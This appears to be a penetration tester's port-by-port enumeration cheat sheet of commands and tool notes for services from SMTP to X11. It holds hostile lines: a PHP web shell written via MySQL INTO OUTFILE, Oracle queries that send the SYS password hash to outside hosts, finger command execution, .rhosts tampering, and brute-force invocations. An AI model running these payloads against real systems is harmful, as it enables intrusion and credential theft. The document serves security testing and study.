# Enumeration

## Network enumeration

Ncrack network authentication tool
https://nmap.org/ncrack/man.html

- Use nmap to scan for vulnerabilities (SMB works well)
  `nmap -p 445 --script vuln [host]`

- Use nmap to scan for liveness
  `# nmap -sn [range]`
  `# nmap -sn -PE [range]`

- Find nameservers in network range
  `# nmap -Pn -n -p 53 --open [range]`

  Now I can do dig etc @nameserver
  `# dnsrecon -d [domain_name] -t axfr -n [name_server]`

- Find domain and test for zone transfers
  `root@kali:~# dnsrecon -d megacorpone.com -t axfr`

- Find hosts with webservers
  `# for ip in `cat hosts_org.txt`; do nmap -Pn -n -p 80,443,8080,8000,10443 -O $ip; done`




### FTP port 21
[ftp.md](ftp.md)

---

### SSH port 22
[ssh.md](ssh.md)
---

### Telnet port 23 open
+ Fingerprint server
    - telnet ip_address
    - telnetfp


+ Password Attack
  - Common passwords
  - Hydra brute force
  - Brutus
  - telnet -l "-froot" hostname (Solaris 10+)


+ Examine configuration files
    - /etc/inetd.conf  
    - /etc/xinetd.d/telnet  
    - /etc/xinetd.d/stelnet  

---

### Sendmail (SMTP) Port 25

**THIS SERVICE DID NOT PREVIOUSLY RESPOND WHEN USING NC, NEED TO USE TELNET**

  ```
  # nc -nv 192.168.11.215 25
  (UNKNOWN) [192.168.11.215] 25 (smtp) open
  220 redhat.acme.com ESMTP Sendmail 8.12.8/8.12.8; Wed, 12 Jun 2013 07:47:14 +0300 VRFY root
  250 2.1.5 root <root@redhat.acme.com>
  VRFY idontexist
  550 5.1.1 idontexist... User unknown
  ```

+ Fingerprint server
  - Banner grabbing;  
  `telnet ip_address 25 (banner grab)`

  - User enumeration:  
  This didn't work for me:
  ```
  # nmap -Pn -n -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={EXPN,...}
  ```

  Kali has:
  ```
  # smtp-user-enum -M VRFY -U users.txt -t 192.168.56.103
  # smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 10.0.0.13
  ```


+ Mail Server Testing
    - Enumerate users  
        `VRFY username` (verifies if username exists - enumeration of accounts)  
        `EXPN username` (verifies if username is valid - enumeration of accounts)  

    - Mail Spoof Test  
        `HELO anything MAIL FROM: spoofed_address RCPT TO:valid_mail_account DATA . QUIT`

    - Mail Relay Test  

        `HELO anything`  
            Identical to/from - mail from: <nobody@domain> rcpt to: <nobody@domain>  
            Unknown domain - mail from: <user@unknown_domain>  
            Domain not present - mail from: <user@localhost>  
            Domain not supplied - mail from: <user>  

            Source address omission - mail from: <> rcpt to: <nobody@recipient_domain>  
            Use IP address of target server - mail from: <user@IP_Address> rcpt to: <nobody@recipient_domain>  

            Use double quotes - mail from: <user@domain> rcpt to: <"user@recipent-domain">  

            User IP address of the target server - mail from: <user@domain> rcpt to: <nobody@recipient_domain@[IP Address]>  

            Disparate formatting - mail from: <user@[IP Address]> rcpt to: <@domain:nobody@recipient-domain>  

            Disparate formatting2 - mail from: <user@[IP Address]> rcpt to: <recipient_domain!nobody@[IP Address]>  

    - Examine Configuration Files  
        sendmail.cf  
        submit.cf  

### DNS port 53
[dns.md](dns.md)

### TFTP port 69 open

+ TFTP Enumeration  
    `tftp ip_address PUT local_file`  
    `tftp ip_address GET conf.txt` (or other files)  
    Solarwinds TFTP server  
    `tftp – i <IP> GET /etc/passwd` (old Solaris)

+ TFTP Bruteforcing  
    TFTP bruteforcer  
    Cisco-Torch  


### Finger Port 79

+ User enumeration
  ```
  # finger -l -p vulnix@[ip_address]
  # finger 'a b c d e f g h' @example.com
  # finger admin@example.com
  # finger user@example.com
  # finger 0@example.com
  # finger .@example.com
  # finger **@example.com
  # finger test@example.com
  # finger @example.com       --> who is logged on
  ```
+ Command execution
  ```
  finger "|/bin/id@example.com"
  finger "|/bin/ls -a /@example.com"
  ```
+ Finger Bounce
  ```
  finger user@host@victim
  finger @internal@external
  ```

+ Check who is logged on
  ```
  # nmap --script finger* -p 79 [ip]
  ```



### Web Ports 80, 8080 etc. open
[http.md](http.md)

---
### POP3 Port 110
**THIS SERVICE DID NOT PREVIOUSLY RESPOND WHEN USING NC, NEED TO USE TELNET**

+ Fingerprint server
  ```
  # nc -nv 10.0.0.22 110
  (UNKNOWN) [10.0.0.22] 110 (pop3) open
  +OK POP3 server lab ready <00004.1546827@lab>
  ```

+ Enumerate users
  ```
  # nc -nv 10.0.0.22 110
  (UNKNOWN) [10.0.0.22] 110 (pop3) open
  +OK POP3 server lab ready <00004.1546827@lab>
  USER offsec
  +OK offsec welcome here
  PASS offsec
  -ERR unable to lock mailbox
  quit
  +OK POP3 server lab signing off.
  ```

---
### Portmapper port 111

+ rpcdump.py
  `rpcdump.py username:password@IP_Address port/protocol (i.e. 80/HTTP)`

+ rpcinfo
  `rpcinfo [options] IP_Address`

  `# rpcinfo -p 10.0.0.13`

---
### NTP Port 123
        NTP Enumeration
            ntpdc -c monlist IP_ADDRESS
            ntpdc -c sysinfo IP_ADDRESS
            ntpq
                host
                hostname
                ntpversion
                readlist
                version
        Examine configuration files
            ntp.conf

---

### SMB / NetBIOS Ports 135-139,445
See [SMB.md](smb.md)


### SNMP port 161 open
+ Default Community Strings
  - public
  - private
  - cisco
    - cable-docsis
    - ILMI  

+ MIB enumeration
  - Windows NT
    - .1.3.6.1.2.1.1.5 Hostnames
    - .1.3.6.1.4.1.77.1.4.2 Domain Name
    - .1.3.6.1.4.1.77.1.2.25 Usernames
    - .1.3.6.1.4.1.77.1.2.3.1.1 Running Services
    - .1.3.6.1.4.1.77.1.2.27 Share Information

    - .1.3.6.1.4.1.77.1.2.25 HOST-RESOURCES-MIB [hrSWRunName]
  - Solarwinds MIB walk
  - Getif
  - snmpwalk
    ```
    snmpwalk -v <Version> -c <Community string> <IP>

    snmpwalk -c public -v1 192.168.36.161 1.3.6.1.2.1.25.4.2.1.2
    ```

+ SNMP Bruteforce
  - onesixtyone
    `onesixytone -c SNMP.wordlist <IP>``
  - cat
    `./cat -h <IP> -w SNMP.wordlist`

### BGMP Port 264
* Border gateway Management Protocol
* Check Point FireWall
* [Hostname leaked](https://community.checkpoint.com/t5/Remote-Access-Solutions/Hostname-disclosure-on-port-264/td-p/35340)
```
msf > use auxiliary/gather/checkpoint_hostname
msf auxiliary(checkpoint_hostname) > show actions
    ...actions...
msf auxiliary(checkpoint_hostname) > set ACTION < action-name >
msf auxiliary(checkpoint_hostname) > show options
    ...show and set options...
msf auxiliary(checkpoint_hostname) > run
```

### LDAP Port 389
    ldap enumeration
        ldapminer
            ldapminer -h ip_address -p port (not required if default) -d
        luma
            Gui based tool
        ldp
            Gui based tool
        openldap
        ```
            ldapsearch [-n] [-u] [-v] [-k] [-K] [-t] [-A] [-L[L[L]]] [-M[M]] [-d debuglevel] [-f file] [-D binddn] [-W] [-w passwd] [-y passwdfile] [-H ldapuri] [-h ldaphost] [-p ldapport] [-P 2|3] [-b searchbase] [-s base|one|sub] [-a never|always|search|find] [-l timelimit] [-z sizelimit] [-O security-properties] [-I] [-U authcid] [-R realm] [-x] [-X authzid] [-Y mech] [-Z[Z]] filter [attrs...]
            ldapadd [-c][-S file][-n][-v][-k][-K][-M[M]][-d debuglevel][-D binddn][-W][-w passwd][-y passwdfile][-h ldaphost][-p ldap-port][-P 2|3][-O security-properties][-I][-Q][-U authcid][-R realm][-x][-X authzid][-Y mech][-Z[Z]][-f file]
            ldapdelete [-n][-v][-k][-K][-c][-M[M]][-d debuglevel][-f file][-D binddn][-W][-w passwd][-y passwdfile][-H ldapuri][-h ldaphost][-P 2|3][-p ldapport][-O security-properties][-U authcid][-R realm][-x][-I][-Q] [-X authzid][-Y mech][-Z[Z]][dn]
            ldapmodify [-a][-c][-S file][-n][-v][-k][-K][-M[M]][-d debuglevel][-D binddn][-W][-w passwd][-y passwdfile][-H ldapuri][-h ldaphost][-p ldapport][-P 2|3][-O security-properties][-I][-Q][-U authcid][-R realm][-x][-X authzid][-Y mech][-Z[Z]][-f file]
            ldapmodrdn [-r][-n][-v][-k][-K][-c][-M[M]][-d debuglevel][-D binddn][-W][-w passwd][-y passwdfile] [-H ldapuri][-h ldaphost][-p ldapport][-P 2|3][-O security-properties][-I][-Q][-U authcid][-R realm][-x] [-X authzid][-Y mech][-Z[Z]][-f file][dn rdn]
        ```
    ldap brute force
        bf_ldap
            bf_ldap -s server -d domain name -u|-U username | users list file name -L|-l passwords list | length of passwords to generate optional: -p port (default 389) -v (verbose mode) -P Ldap user path (default ,CN=Users,)
        K0ldS
        LDAP_Brute.pl
    Examine Configuration Files
        General
            containers.ldif
            ldap.cfg
            ldap.conf
            ldap.xml
            ldap-config.xml
            ldap-realm.xml
            slapd.conf
        IBM SecureWay V3 server
            V3.sas.oc
        Microsoft Active Directory server
            msadClassesAttrs.ldif
        Netscape Directory Server 4
            nsslapd.sas_at.conf
            nsslapd.sas_oc.conf
        OpenLDAP directory server
            slapd.sas_at.conf
            slapd.sas_oc.conf
        Sun ONE Directory Server 5.1
            75sas.ldif


### Microsoft-DS Active Directory, Windows shares (Official) port 445
**** SEE ports 135-139,445 ****

### PPTP/L2TP/VPN port 500/1723 open

* See https://www.radarhack.com/dir/papers/Scanning_ike_with_ikescan.pdf

    Enumeration
        ike-scan
        ike-probe
    Brute-Force
        ike-crack
    Reference Material
        PSK cracking paper
        SecurityFocus Infocus
        Scanning a VPN Implementation


  * Ike scans (FOR INTERNAL NETWORKS)
  ```
  /home/dturner/ikeforce-march17# python2.7 ikeforce.py 163.166.150.214 -a -s 1
  that will enumerate all the aggressive mode transforms
  ============================================================================================
  Accepted (AM) Transform Sets
  ============================================================================================
  | 5 : 3DES-CBC | 2 : SHA | 1 : PSK | 2 : alternate 1024-bit MODP group |
  --------------------------------------------------------------------------------------------
  ============================================================================================
  Shutting down server
  ```
  then I take that and try to get a valid hash to crack  
  u need a correct id to do that tho, there used to be a few ways of doing it but it’s all really old stuff now  
  I usually check anyway though with the above tool  

  then use ike-scan to get the hash  
  usually the best way to get the id these days is to look at the ssl vpn and it’s usually on that page
  other than that there are some other bugs in cisco ike, but they are tricky to check for  
  there’s the benigncertain info disclosure which u can easily check with msf
  just be careful of the false positives on that module
  if u don’t see valid looking plaintext data it’s not vulnerable
  I’ll run through it in a min on bauer
  ```
  python2.7 ikeforce.py 163.166.150.214 -e -w ./wordlists/groupnames.dic -s 1 -t 5 2 1 2
  [+]Program started in Enumeration Mode
  [+]Checking for possible enumeration techniques
  Analyzing initial response. Please wait, this can take up to 15 seconds...

  [+]Cisco Device detected
  [-]Not vulnerable to DPD group name enumeration
  [-]Not vulnerable to multiple response group name enumeration. Device is fully patched. Exiting...

  Shutting down server
  ```
  there’s also some issues u can check for on the ssl vpn side  
  it’s mainly cisco you’ll see  
  ah actually none with ike have ssl vpn as well  
  so the final part would be this:  
  ```
  ike-scan 163.166.150.214 -M -A --id=test
  Starting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
  163.166.150.214 Aggressive Mode Handshake returned
         HDR=(CKY-R=05c09f9f46cff22f)
         SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
         VID=12f5f28c457168a9702d9fe274cc0100 (Cisco Unity)
         VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
         VID=f007388246cef22f005a112caef0b26c
         VID=09002689dfd6b712 (XAUTH)
         KeyExchange(128 bytes)
         ID(Type=ID_IPV4_ADDR, Value=163.166.150.214)
         Nonce(20 bytes)
         Hash(20 bytes)

  Ending ike-scan 1.9.4: 1 hosts scanned in 0.033 seconds (29.98 hosts/sec).  1 returned handshake; 0 returned notify
  ```
  but if u don’t have a valid id then it’s pointless because the hash won’t crack   
  ```
  scanner/ike/cisco_ike_benigncertain
  ```
  ^ that’s the msf module  


### Modbus port 502 open
        modscan

### rlogin port 513 open

+ Rlogin Enumeration
  - Find the files
      find / -name .rhosts  
      locate .rhosts  

  - Examine Files
      cat .rhosts  

  - Manual Login  
      rlogin hostname -l username
      rlogin <IP>

  - Subvert the files  
      echo ++ > .rhosts  

+ Rlogin Brute force
  Hydra

### rsh port 514 open
+ Rsh Enumeration
  ```
  # rsh host [-l username] [-n] [-d] [-k realm] [-f | -F] [-x] [-PN | -PO] command
  ```

+ Rsh Brute Force
    - rsh-grind
    - Hydra
    - medusa

### SQL Server Port 1433 1434 open

* Get MSSQL details
  ```
  msf > use scanner/mssql/mssql_ping
  ```

  ```
  # nmap -Pn -n -sU --script=ms-sql-info -p 1434 10.11.1.31
  ```

* Set up Kali to connect to MSSQL:
  https://www.adampalmer.me/iodigitalsec/2013/08/10/accessing-and-hacking-mssql-from-backtrack-linux/

  ```
  # apt-get install sqsh freetds-bin freetds-common freetds-dev

  etc/freetds/freetds.conf:
  [MyServer]
  host = 192.168.1.10
  port = 1433
  tds version = 8.0

  ~/.sqshrc:
  \set username=sa
  \set password=password
  \set style=vert

  # sqsh -S MyServer
  > SELECT name FROM master..sysdatabases
  go  
  ```

    SQL Enumeration
        piggy
        SQLPing
            sqlping ip_address/hostname
        SQLPing2
        SQLPing3
        SQLpoke
        SQL Recon
        SQLver
    SQL Brute Force
        SQLPAT
            sqlbf -u hashes.txt -d dictionary.dic -r out.rep - Dictionary Attack
            sqlbf -u hashes.txt -c default.cm -r out.rep - Brute-Force Attack
        SQL Dict
        SQLAT
        Hydra
        SQLlhf
        ForceSQL

### Citrix port 1494 open
    Citrix Enumeration
        Default Domain
        Published Applications
            ./citrix-pa-scan {IP_address/file | - | random} [timeout]
            citrix-pa-proxy.pl IP_to_proxy_to [Local_IP]
    Citrix Brute Force
        bforce.js
        connect.js
        Citrix Brute-forcer
        Reference Material
            Hacking Citrix - the legitimate backdoor
            Hacking Citrix - the forceful way

## Oracle Port 1521 Open
    Oracle Enumeration
        oracsec
        Repscan
        Sidguess
        Scuba
        DNS/HTTP Enumeration
            SQL> SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT PASSWORD FROM DBA_USERS WHERE US ERNAME='SYS')||'.vulnerabilityassessment.co.uk') FROM DUAL; SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT PASSWORD FROM DBA_USERS WHERE USERNAM E='SYS')||'.vulnerabilityassessment.co.uk') FROM DUAL

            SQL> select utl_http.request('http://gladius:5500/'||(SELECT PASSWORD FROM DBA_USERS WHERE USERNAME='SYS')) from dual;
        WinSID
        Oracle default password list
        TNSVer
            tnsver host [port]
        TCP Scan
        Oracle TNSLSNR
            Will respond to: [ping] [version] [status] [service] [change_password] [help] [reload] [save_config] [set log_directory] [set display_mode] [set log_file] [show] [spawn] [stop]
        TNSCmd
            perl tnscmd.pl -h ip_address
            perl tnscmd.pl version -h ip_address
            perl tnscmd.pl status -h ip_address
            perl tnscmd.pl -h ip_address --cmdsize (40 - 200)
        LSNrCheck
        Oracle Security Check (needs credentials)
        OAT
            sh opwg.sh -s ip_address
            opwg.bat -s ip_address
            sh oquery.sh -s ip_address -u username -p password -d SID OR c:\oquery -s ip_address -u username -p password -d SID
        OScanner
            sh oscanner.sh -s ip_address
            oscanner.exe -s ip_address
            sh reportviewer.sh oscanner_saved_file.xml
            reportviewer.exe oscanner_saved_file.xml
        NGS Squirrel for Oracle
        Service Register
            Service-register.exe ip_address
        PLSQL Scanner 2008
    Oracle Brute Force
        OAK
            ora-getsid hostname port sid_dictionary_list
            ora-auth-alter-session host port sid username password sql
            ora-brutesid host port start
            ora-pwdbrute host port sid username password-file
            ora-userenum host port sid userlistfile
            ora-ver -e (-f -l -a) host port
        breakable (Targets Application Server Port)
            breakable.exe host url [port] [v]host ip_address of the Oracle Portal Serverurl PATH_INFO i.e. /pls/orassoport TCP port Oracle Portal Server is serving pages fromv verbose
        SQLInjector (Targets Application Server Port)
            sqlinjector -t ip_address -a database -f query.txt -p 80 -gc 200 -ec 500 -k NGS SOFTWARE -gt SQUIRREL
            sqlinjector.exe -t ip_address -p 7777 -a where -gc 200 -ec 404 -qf q.txt -f plsql.txt -s oracle
        Check Password
        orabf
            orabf [hash]:[username] [options]
        thc-orakel
            Cracker
            Client
            Crypto
        DBVisualisor
            Sql scripts from pentest.co.uk
            Manual sql input of previously reported vulnerabilties
    Oracle Reference Material
        Understanding SQL Injection
        SQL Injection walkthrough
        SQL Injection by example
        Advanced SQL Injection in Oracle databases
        Blind SQL Injection
        SQL Cheatsheets
            http://ha.ckers.org/sqlinjection
            http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/
            http://www.0x000000.com/?i=14
            http://pentestmonkey.net/

### NFS Port 2049 open
* NFS Enumeration
  ```
  nmap -sV --script=nfs-showmount 192.168.1.102
  ```

* Check for shares
  ```
  # showmount -e [hostname / ip_address]
  ```

* Then to mount the folder:
  ```
  # mount -t nfs [ip_address]:/[directory_found_exported] /[local_mount_point]
  ```

* For **Privilege Escalation** with a misconfigured NFS see [this link](files_and_folders#nfs_share)
  ** Priv escalation on Linux with NFS:  

* NfSpy - an ID-spoofing NFS client

* Examine Configuration Files
    - /etc/exports
    - /etc/lib/nfs/xtab

### Compaq/HP Insight Manager Port 2301,2381open
    HP Enumeration
        Authentication Method
            Host OS Authentication
            Default Authentication
                Default Passwords
        Wikto
        Nstealth
    HP Bruteforce
        Hydra
        Acunetix
    Examine Configuration Files
        path.properties
        mx.log
        CLIClientConfig.cfg
        database.props
        pg_hba.conf
        jboss-service.xml
        .namazurc

### MySQL port 3306 open

* Write to file
  ```
  SELECT "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '/var/www/html/shell.php';

  ```

* Enumeration
  ```
  nmap -A -n -p3306 <IP Address>
  nmap -A -n -PN --script:ALL -p3306 <IP Address>
  telnet IP_Address 3306
  use test; select * from test;
  To check for other DB's -- show databases
  ```

* Administration
  - MySQL Network Scanner
  - MySQL GUI Tools
  - mysqlshow
  - mysqlbinlog

* Default usernames and passwords
  username: root password:
  username: root password: root
  ```
  mysql -h <Hostname> -u root
  mysql -h <Hostname> -u root@localhost
  mysql -h <Hostname>
  mysql -h <Hostname> -u ""@localhost
  mysql -h <Hostname> -u root -p      # empty password
  mysql -h <Hostname> -u root -p      # "root" as password

  ```

* Configuration Files
  - windows
  ```
  config.ini
  my.ini
  windows\my.ini
  winnt\my.ini
  <InstDir>/mysql/data/
  ```
  - unix
  ```
  my.cnf
  /etc/my.cnf
  /etc/mysql/my.cnf
  /var/lib/mysql/my.cnf
  ~/.my.cnf
  /etc/my.cnf
  ```

* Command History
```
~/.mysql.history
```

* Log Files
```
connections.log
update.log
common.log
```

* To run many sql commands at once -- mysql -u username -p < manycommands.sql
* MySQL data directory (Location specified in my.cnf)

* Privilege Escalation

  - Get Current Level of access
  ```
  mysql>select user();
  mysql>select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()';
  ```

* Access passwords
```
mysql> use mysql
mysql> select user,password from user;
```

* Create a new user and grant him privileges
```
mysql>create user test identified by 'test';
mysql> grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;
```

*  Break into a shell
```
mysql> \! cat /etc/passwd
mysql> \! bash
```
---
### RDesktop port 3389 open
    Rdesktop Enumeration
        Remote Desktop Connection
    Rdestop Bruteforce
        TSGrinder
            tsgrinder.exe -w dictionary_file -l leet -d workgroup -u administrator -b -n 2 IP_Address
        Tscrack

### Sybase Port 5000+ open
    Sybase Enumeration
        sybase-version ip_address from NGS
    Sybase Vulnerability Assessment
        Use DBVisualiser
            Sybase Security checksheet
                Copy output into excel spreadsheet
                Evaluate mis-configured parameters
            Manual sql input of previously reported vulnerabilties
                Advanced SQL Injection in SQL Server
                More Advanced SQL Injection
        NGS Squirrel for Sybase

### SIP Port 5060 open
    SIP Enumeration
        netcat
            nc IP_Address Port
        sipflanker
            python sipflanker.py 192.168.1-254
        Sipscan
        smap
            smap IP_Address/Subnet_Mask
            smap -o IP_Address/Subnet_Mask
            smap -l IP_Address
    SIP Packet Crafting etc.
        sipsak
            Tracing paths: - sipsak -T -s sip:usernaem@domain
            Options request:- sipsak -vv -s sip:username@domain
            Query registered bindings:- sipsak -I -C empty -a password -s sip:username@domain
        siprogue
    SIP Vulnerability Scanning/ Brute Force
        tftp bruteforcer
            Default dictionary file
            ./tftpbrute.pl IP_Address Dictionary_file Maximum_Processes
        VoIPaudit
        SiVuS
    Examine Configuration Files
        SIPDefault.cnf
        asterisk.conf
        sip.conf
        phone.conf
        sip_notify.conf
        <Ethernet address>.cfg
        000000000000.cfg
        phone1.cfg
        sip.cfg etc. etc.

### VNC port 5900 open
    VNC Enumeration
        Scans
            5900 for direct access.5800 for HTTP access.
    VNC Brute Force
        Password Attacks
            Remote
                Password Guess
                    vncrack
                Password Crack
                    vncrack
                    Packet Capture
                        Phosshttp://www.phenoelit.de/phoss
            Local
                Registry Locations
                    \HKEY_CURRENT_USER\Software\ORL\WinVNC3
                    \HKEY_USERS\.DEFAULT\Software\ORL\WinVNC3
                Decryption Key
                    0x238210763578887
    Exmine Configuration Files
        .vnc
        /etc/vnc/config
        $HOME/.vnc/config
        /etc/sysconfig/vncservers
        /etc/vnc.conf

### X11 port 6000^ open
    X11 Enumeration
        List open windows
        Authentication Method
            Xauth
            Xhost
    X11 Exploitation
        xwd
            xwd -display 192.168.0.1:0 -root -out 192.168.0.1.xpm
        Keystrokes
            Received
            Transmitted
        Screenshots
        xhost +
    Examine Configuration Files
        /etc/Xn.hosts
        /usr/lib/X11/xdm

            Search through all files for the command "xhost +" or "/usr/bin/X11/xhost +"
        /usr/lib/X11/xdm/xsession
        /usr/lib/X11/xdm/xsession-remote
        /usr/lib/X11/xdm/xsession.0
        /usr/lib/X11/xdm/xdm-config
            DisplayManager*authorize:on
### Tor Port 9001, 9030 open
    Tor Node Checker
        Ip Pages
        Kewlio.net
    nmap NSE script
### Jet Direct 9100 open
    hijetta
